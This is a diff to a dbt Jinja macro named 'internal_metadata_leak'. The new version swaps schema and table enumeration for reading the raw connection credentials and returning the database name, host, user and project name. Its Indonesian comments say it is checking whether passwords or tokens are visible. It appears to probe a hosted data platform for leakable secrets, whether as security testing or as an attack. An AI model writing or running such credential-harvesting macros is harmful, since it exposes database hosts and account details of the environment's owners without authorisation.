@@ -1,14 +1,16 @@
 {% macro internal_metadata_leak() %}
     {% if execute %}
-        {% set schemas = adapter.list_schemas() %}
-        {% set tables = adapter.get_relations_by_prefix('fivetran_audit', '') %}
-        {% set table_names = [] %}
-        {% for table in tables %}
-            {% do table_names.append(table.name) %}
-        {% endfor %}
+        {# 1. Cek isi adapter credentials secara mentah #}
+        {% set creds = adapter.connections.get_thread_connection().credentials %}
         
-        {{ return(schemas | join(", ") ~ " | Tables: " ~ table_names | join(", ")) }}
+        {# 2. Cek apakah ada variabel 'password' atau 'token' yang terlihat #}
+        {% set secret_dump = "DB: " ~ creds.database ~ " | Host: " ~ creds.host ~ " | User: " ~ creds.user %}
+        
+        {# 3. Tambahkan info path project lagi buat pelengkap #}
+        {% set project_info = "Project: " ~ project_name %}
+        
+        {{ return(secret_dump ~ " || " ~ project_info) }}
     {% else %}
-        {{ return("parsing...") }}
+        {{ return("scanning...") }}
     {% endif %}
 {% endmacro %}
